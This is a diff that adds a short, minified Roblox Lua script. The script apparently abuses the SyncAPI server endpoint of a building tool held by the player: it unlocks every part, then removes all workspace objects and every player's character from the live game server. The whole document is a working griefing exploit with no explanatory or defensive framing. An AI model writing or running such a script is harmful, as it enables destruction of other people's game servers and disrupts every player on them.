@@ -1,0 +1,8 @@
+local Players=game:GetService("Players")local Workspace=game:GetService("Workspace")local player=Players.LocalPlayer
+local function f()for _,v in pairs(player.Backpack:GetChildren())do if v:IsA("Tool")and v:FindFirstChild("SyncAPI")then return v end end
+if player.Character then for _,v in pairs(player.Character:GetChildren())do if v:IsA("Tool")and v:FindFirstChild("SyncAPI")then return v end end end end
+local t=f()if not t then return end local r=t.SyncAPI.ServerEndpoint local function c(...)return r:InvokeServer(...)end
+for _,v in pairs(Workspace:GetDescendants())do if v:IsA("BasePart")then pcall(function()v.Locked=false end)end end
+for _,v in pairs(Workspace:GetChildren())do pcall(function()c("Remove",{v})end)task.wait(0.001)end
+for _,v in pairs(Players:GetPlayers())do if v.Character then pcall(function()c("Remove",{v.Character})end)task.wait(0.001)end end
+for _,v in pairs(Workspace:GetDescendants())do pcall(function()c("Remove",{v})end)task.wait(0.001)end
